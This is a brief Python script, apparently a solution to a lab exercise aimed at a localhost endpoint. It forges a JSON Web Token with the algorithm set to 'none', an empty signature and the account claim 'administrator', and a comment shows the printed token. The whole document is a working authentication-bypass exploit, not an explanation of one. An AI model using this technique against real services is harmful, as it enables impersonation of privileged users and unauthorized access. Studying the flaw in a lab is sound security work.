import base64
import json

header_data = {
    "alg": "none",
    "typ": "JWT"
}

payload_data = {
    "account": "administrator",
    "role": "User",           
    "iat": 1764509083,
    "aud": "https://127.0.0.1/jwt/none"
}

def encode_jwt_part(data):
    json_str = json.dumps(data, separators=(",", ":"))
    return base64.urlsafe_b64encode(json_str.encode()).decode().rstrip("=")

fake_token = f"{encode_jwt_part(header_data)}.{encode_jwt_part(payload_data)}."

print(fake_token) #eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJhY2NvdW50IjoiYWRtaW5pc3RyYXRvciIsInJvbGUiOiJVc2VyIiwiaWF0IjoxNzY0NTA5MDgzLCJhdWQiOiJodHRwczovLzEyNy4wLjAuMS9qd3Qvbm9uZSJ9.